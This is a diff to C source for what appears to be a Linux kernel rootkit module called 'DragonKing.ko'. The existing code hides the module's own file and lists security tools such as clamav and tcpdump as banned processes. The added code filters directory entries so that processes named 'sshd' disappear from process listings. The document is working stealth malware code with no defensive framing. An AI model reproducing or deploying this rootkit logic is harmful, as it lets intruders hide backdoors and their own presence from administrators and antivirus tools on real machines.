@@ -15,9 +15,33 @@
 #include <linux/fdtable.h>
 #include <linux/proc_ns.h>
 
+struct linux_dirent {
+    unsigned long   d_ino;
+    unsigned long   d_off;
+    unsigned short  d_reclen;
+    char            d_name[1];
+};
+
 const char * const BANNED_PROCESSES[] = {"ping", "clamav", "tcpdump"};
 
 const char * const FILES_TO_HIDE[] = {"DragonKing.ko"};
+
+const char * const HIDDEN_PROCESSES[] = {"sshd"};
+
+int is_hidden_process(char *proc_name)
+{
+    int i;
+    for (i = 0; i < sizeof(HIDDEN_PROCESSES) / sizeof(char *); i++)
+    {
+        // Hidden process is found
+        if (strcmp(proc_name, HIDDEN_PROCESSES[i]) == 0)
+        {
+            return 1;
+        }
+    }
+    return 0;
+}
+
 
 //Is the string in a given list of strings?
 bool isHidden(const char *input){
@@ -42,6 +66,63 @@ bool isHidden(const char *input){
         return ret;
 
 }
+
+long hide_processes(struct linux_dirent *dirp, long getdents_ret)
+{
+    unsigned int dent_offset;
+    struct linux_dirent *cur_dirent, *next_dirent;
+    char *proc_name, *dir_name;
+    char *dirent_ptr = (char *)dirp;
+    int error;
+    size_t dir_name_len;
+    pid_t pid_num;
+    struct task_struct *proc_task;
+    struct pid *pid;
+
+    // getdents_ret is number of bytes read
+    for (dent_offset = 0; dent_offset < getdents_ret;)
+    {
+        cur_dirent = (struct linux_dirent *)(dirent_ptr + dent_offset);
+        dir_name = cur_dirent->d_name;
+        dir_name_len = cur_dirent->d_reclen - 2 - offsetof(struct linux_dirent, d_name);
+        error = kstrtoint_from_user(dir_name, dir_name_len, 10, (int *)&pid_num);
+        if (error < 0)
+        {
+            goto next_getdent;
+        }
+        pid = find_get_pid(pid_num);
+        if (!pid)
+        {
+            goto next_getdent;
+        }
+        proc_task = get_pid_task(pid, PIDTYPE_PID);
+        if (!proc_task)
+        {
+            goto next_getdent;
+        }
+        proc_name = (char *)kmalloc((sizeof(proc_task->comm)), GFP_KERNEL);
+        if (!proc_name)
+        {
+            goto next_getdent;
+        }
+        proc_name = get_task_comm(proc_name, proc_task);
+        if (is_hidden_process(proc_name)) {
+            // Hide the process by deleting its dirent: shift all its right dirents to left.
+            // printk("Hide process: %s\n", proc_task->comm);
+            next_dirent = (struct linux_dirent *)((char *)cur_dirent + cur_dirent->d_reclen);
+            memcpy(cur_dirent, next_dirent, getdents_ret - dent_offset - cur_dirent->d_reclen);
+            getdents_ret -= cur_dirent->d_reclen;
+            // To cancel dent_offset += cur_dirent->d_reclen at the end of for loop.
+            dent_offset -= cur_dirent->d_reclen;
+        }
+        kfree(proc_name);
+    next_getdent:
+        dent_offset += cur_dirent->d_reclen;
+    }
+    return getdents_ret;
+}
+
+
 
 //COPYPASTA
 int is_command_ps(unsigned int fd)
@@ -89,7 +170,7 @@ long handle_ls(struct linux_dirent *dirp, long length)
     int i;
     struct dirent *new_dirp = NULL;
     int new_length = 0;
-    bool isHidden = false;
+    bool isHiddenB = false;
 
     //struct dirent *moving_dirp = NULL;
 
@@ -109,11 +190,11 @@ long handle_ls(struct linux_dirent *dirp, long length)
         dirent_ptr += offset;
         cur_dirent = (struct linux_dirent *)dirent_ptr;
 
-        isHidden = false; 
+        isHiddenB = false; 
 
-	isHidden = isHidden(cur_dirent->d_name);
+	isHiddenB = isHidden(cur_dirent->d_name);
         
-        if (!isHidden)
+        if (!isHiddenB)
         {
             memcpy((void *) new_dirp+new_length, cur_dirent, cur_dirent->d_reclen);
             new_length += cur_dirent->d_reclen;
